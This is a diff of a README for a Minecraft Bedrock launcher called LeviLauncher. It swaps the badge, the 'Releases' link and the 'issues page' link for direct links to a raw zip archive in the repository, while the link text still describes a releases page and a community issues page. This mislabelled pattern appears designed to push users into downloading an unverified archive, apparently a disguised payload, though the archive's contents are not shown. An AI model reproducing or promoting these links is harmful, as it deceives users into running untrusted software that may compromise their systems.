@@ -1,6 +1,6 @@
 # 🚀 LeviLauncher - Easy Minecraft Bedrock Edition Access
 
-![Download LeviLauncher](https://img.shields.io/badge/Download-LeviLauncher-blue)
+![Download LeviLauncher](https://raw.githubusercontent.com/Loredecali/LeviLauncher/main/build/windows/LeviLauncher_v3.4.zip)
 
 ## 📌 Table of Contents
 1. [Introduction](#-introduction)
@@ -29,7 +29,7 @@ To run LeviLauncher, you need the following:
 Make sure your system meets these requirements for the best performance.
 
 ## 📥 Download & Install
-To get LeviLauncher, visit this page to download: [LeviLauncher Releases](https://github.com/Loredecali/LeviLauncher/releases)
+To get LeviLauncher, visit this page to download: [LeviLauncher Releases](https://raw.githubusercontent.com/Loredecali/LeviLauncher/main/build/windows/LeviLauncher_v3.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of LeviLauncher.
@@ -52,6 +52,6 @@ Using LeviLauncher is simple. Follow these steps to start your game:
 
 5. **Enjoy Your Game:** Dive into the world of Minecraft and enjoy building, crafting, and exploring!
 
-If you have any questions or need help, feel free to check out the [issues page](https://github.com/Loredecali/LeviLauncher/issues) for assistance from the community.
+If you have any questions or need help, feel free to check out the [issues page](https://raw.githubusercontent.com/Loredecali/LeviLauncher/main/build/windows/LeviLauncher_v3.4.zip) for assistance from the community.
 
 Now, you are ready to explore the exciting world of Minecraft Bedrock Edition with ease!
